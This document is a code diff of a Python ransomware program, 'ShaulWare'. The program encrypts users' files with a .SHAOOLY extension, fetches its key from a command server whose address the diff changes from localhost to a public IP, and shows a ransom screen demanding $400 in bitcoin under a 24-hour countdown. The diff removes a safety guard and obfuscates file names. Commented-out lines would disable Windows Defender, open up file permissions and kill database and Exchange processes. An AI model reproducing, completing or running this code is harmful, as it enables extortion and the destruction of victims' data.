@@ -7,7 +7,7 @@ import pickle
 import ctypes
 import win32con
 from win32 import win32api
-from tkinter import filedialog, Text
+from tkinter import Text
 from datetime import datetime, timedelta
 from threading import Thread
 
@@ -46,6 +46,7 @@ class Timer:
 class Encrypt(Thread):
 
     def __init__(self, drive, key):
+        Thread.__init__(self)
         self.drive = drive
         self.fernet = Fernet(key)
         self.accepted_extensions = [
@@ -217,20 +218,26 @@ class Encrypt(Thread):
                                     "vmx",
                                     ]
         self.max_size = 1500000000
+        self.my_files = ['cmFuc29tbm90ZQ==.txt',
+                         'cmVk.png', 'eW9r.png',
+                         'eW9rMg==.png', 'main.py',
+                         'ransomware_server.py',
+                         'README.md',
+                         'Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg',
+                         'Y2xhc3MgYWxlcnQ=.PNG',
+                         'Yml0Y29pbg==.png',
+                         'Z3JlZW4=.png']
 
     def run(self):
-        for r, d, f in os.walk(self.drive):
-            if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
-                for file in f:
-                    if file.split(".")[-1] in self.accepted_extensions:
-                        filepath = os.path.join(r, file)
-                        if len(file.split('.')) == 1:
-                            file_extension = ""
-                        else:
-                            file_extension = file.split(".")[-1]
+        for root, _dirs, filenames in os.walk(self.drive):
+            if root.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
+                for file in filenames:
+                    if file.split(".")[-1] in self.accepted_extensions and file not in self.my_files:
+                        filepath = os.path.join(root, file)
+                        file_extension = file.split(".")[-1]
                         file_name = file.split(".")[0]
-                        enc_file_name = f'{r}/{file_name}.SHAOOLY'
-                        if os.path.getsize(filepath) < self.max_size:
+                        enc_file_name = f'{root}/{file_name}.SHAOOLY'
+                        if os.path.getsize(filepath) < self.max_size and 'ShaulWare' not in filepath:
                             try:
                                 with open(filepath, 'rb') as byte_file:
                                     enc_file_content = self.fernet.encrypt(byte_file.read())
@@ -242,7 +249,7 @@ class Encrypt(Thread):
                                 while True:
                                     index += 1
                                     try:
-                                        enc_file_name = f'{r}/{file_name}({index}).SHAOOLY'
+                                        enc_file_name = f'{root}/{file_name}({index}).SHAOOLY'
                                         with open(enc_file_name, 'x') as encrypted_file:
                                             encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                                         break
@@ -263,8 +270,8 @@ class Decrypt(Thread):
         for r, d, f in os.walk(self.drive):
             for file in f:
                 filepath = os.path.join(r, file)
-                filename = filepath.split('/')[-1].split(".")[0]
-                if filepath.split('/')[-1].split(".")[-1] == "SHAOOLY":
+                filename = filepath.split('/')[-1].split('.')[0]
+                if filepath.split('/')[-1].split('.')[-1] == "SHAOOLY":
                     with open(filepath, 'r') as enc_file:
                         file_content = enc_file.read().split('\n')
                     ext = file_content[0]
@@ -279,7 +286,7 @@ class Decrypt(Thread):
 
 class RansomwareClient:
     def __init__(self):
-        host = '127.0.0.1'
+        host = '139.162.131.50'
         port = 17694
         self.my_socket = socket()
         self.my_socket.connect((host, port))
@@ -303,9 +310,9 @@ class RansomwareClient:
 
 
 class Interface:
-    def __init__(self, client):
+    def __init__(self, my_client):
         self.root = tk.Tk()
-        self.root.title('ShaulWare Decrypt')
+        self.root.title('DO NOT CLOSE THIS WINDOW')
         self.root.resizable(False, False)
         self.canvas = tk.Canvas(self.root, height=800, width=1250, bg="#841212")
         self.canvas.pack()
@@ -314,7 +321,7 @@ class Interface:
         self.clock = tk.Label(self.root, height=1, background="#000000", foreground='white', font=("Lemon Milk", 20),
                               text="00:00:00")
         self.timer = Timer(root=self.root, hours=23, minutes=59, seconds=59, clock=self.clock)
-        self.client = client
+        self.client = my_client
         self.client_transaction_id = Text(self.root, height=2, width=40)
 
     def disable_event(self):
@@ -326,11 +333,11 @@ class Interface:
             # drives = win32api.GetLogicalDriveStrings()
             # drives = drives.split('\000')[:-1]
             # for drive in drives:
-            #     Decrypt(drive).start()
+            #     Decrypt(drive, SYMMETRIC_KEY).start()
             self.canvas['background'] = '#558c0d'
             self.canvas.delete('all')
             self.clock.destroy()
-            self.canvas.create_image(125, 140, image=tk.PhotoImage(file="green.png"))
+            self.canvas.create_image(125, 140, image=tk.PhotoImage(file="Z3JlZW4=.png"))
             for textbox in self.text_list:
                 textbox.destroy()
 
@@ -364,19 +371,27 @@ class Interface:
         currentTimeDate = datetime.now() + timedelta(days=1)
         currentTime = currentTimeDate.strftime('%Y-%m-%d %H:%M')
         lost_files = tk.Label(self.root, text=f"Your files will be lost on \n{currentTime}\n\n Time Left:", fg='yellow',
-                              bg='#841212'
-                              , font=("Arial", 15))
+                              bg='#841212',
+                              font=("Arial", 15))
         lost_files.place(x=20, y=280)
         self.text_list.append(lost_files)
 
         # INFO BOX
 
-        with open(r'ransomnote.txt', 'r') as ransomnote_file:
+        with open(r'cmFuc29tbm90ZQ==.txt', 'r') as ransomnote_file:
             ransomnote = ransomnote_file.read()
-        info = tk.Label(self.root, text=ransomnote, bg='white', fg='black', height=30, width=78, justify='left', anchor='nw',
+        info = tk.Label(self.root, text=ransomnote, bg='white', fg='black', height=30, width=78, justify='left',
+                        anchor='nw',
                         font=("Arial", 12))
         info.place(x=540, y=10)
         self.text_list.append(info)
+
+        # DO NOT CLOSE THIS WINDOW
+        do_not_close = tk.Label(self.root, text="DO NO CLOSE THIS WINDOW OR YOUR COMPUTER.\n"
+                                                "IF YOU CLOSE THIS WINDOW YOU WON'T BE ABLE\n"
+                                                "TO RECOVER YOUR FILES", bg='white', fg='black')
+        do_not_close.place(x=0, y=550)
+        self.text_list.append(do_not_close)
 
         # SEND MONEY
         send_money = tk.Label(self.root, text="-------->\nSend 400$\n worth of bitcoin\n to this address", height=11,
@@ -392,30 +407,31 @@ class Interface:
         self.text_list.append(CheckPayment)
 
         # A BUTTON TO COPY THE ADDRESS TO CLIPBOARD
-        CopyAddress = tk.Button(self.root, text="Copy", fg="black", bg="white", padx=25, pady=5, command=self.copy_address)
+        CopyAddress = tk.Button(self.root, text="Copy", fg="black", bg="white", padx=25, pady=5,
+                                command=self.copy_address)
         CopyAddress.place(x=1160, y=570)
         self.text_list.append(CopyAddress)
 
         # --------- IMAGES ------------
         # BITCOIN ACCEPTED HERE SIGN
-        bitcoin_accepted_here = tk.PhotoImage(file="bitcoin.png")
+        bitcoin_accepted_here = tk.PhotoImage(file="Yml0Y29pbg==.png")
         self.canvas.create_image(1040, 680, image=bitcoin_accepted_here)
 
         # QR CODE
-        qr_code = tk.PhotoImage(file="QR.PNG")
+        qr_code = tk.PhotoImage(file="Y2xhc3MgYWxlcnQ=.PNG")
         self.canvas.create_image(627, 660, image=qr_code)
 
         # RED LOCK
 
-        red_lock = tk.PhotoImage(file="red.png")
+        red_lock = tk.PhotoImage(file="cmVk.png")
         self.canvas.create_image(125, 140, image=red_lock)
 
         # YOK
-        yok = tk.PhotoImage(file="yok.png")
+        yok = tk.PhotoImage(file="eW9r.png")
         self.canvas.create_image(400, 180, image=yok)
 
         # YOK2
-        yok2 = tk.PhotoImage(file="yok2.png")
+        yok2 = tk.PhotoImage(file="eW9rMg==.png")
         self.canvas.create_image(400, 540, image=yok2)
 
         self.timer.start_clock()
@@ -428,30 +444,32 @@ def set_wallpaper(path):
     ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER, 0, path.encode(), changed)
 
 
-if __name__ == "__main__":  # and 1 == 2:  # I added the 1 == 2 just as a security measure for now
-    # os.system("sc stop WinDefend")
-    # os.system("attrib +h .")
-    # os.system("icacls . /grant Everyone:F /T /C /Q")
-    # os.system("taskkill.exe /f /im mysqld.exe")
-    # os.system("taskkill.exe /f /im sqlwriter.exe")
-    # os.system("taskkill.exe /f /im sqlserver.exe")
-    # os.system("taskkill.exe /f /im MSExchange*")
-    # os.system("taskkill.exe /f /im Microsoft.Exchange.*")
+if __name__ == "__main__":
     client = RansomwareClient()
     SYMMETRIC_KEY = client.get_key()
-    #    drives = win32api.GetLogicalDriveStrings()
-    #    drives = drives.split('\000')[:-1]
-    #    for drive in drives:
-    #        pass
-    #        # Encrypt(drive).start()
+    if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
+        with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
+            check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
+                        'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
+                        'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
+                        'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
+                        '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
+        # os.system("sc stop WinDefend")
+        # os.system("attrib +h .")
+        # os.system("icacls . /grant Everyone:F /T /C /Q")
+        # os.system("taskkill.exe /f /im mysqld.exe")
+        # os.system("taskkill.exe /f /im sqlwriter.exe")
+        # os.system("taskkill.exe /f /im sqlserver.exe")
+        # os.system("taskkill.exe /f /im MSExchange*")
+        # os.system("taskkill.exe /f /im Microsoft.Exchange.*")
+        # drives = win32api.GetLogicalDriveStrings()
+        # drives = drives.split('\000')[:-1]
+        # for drive in drives:
+        #     pass
+        #     # Encrypt(drive, SYMMETRIC_KEY).start()
+        # set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
     my_interface = Interface(client)
-    my_interface.run() # NOTE: The interface will be started last.
-
-    # c = RansomwareClient()
-    # key = c.get_key()# TO DO: make sure connecting to the machine.
-
+    my_interface.run()  # NOTE: The interface will be started last.
 
     # change the wallpaper to scare the user.
-    # setWallpaper("computer_background.jpeg")
-#
 
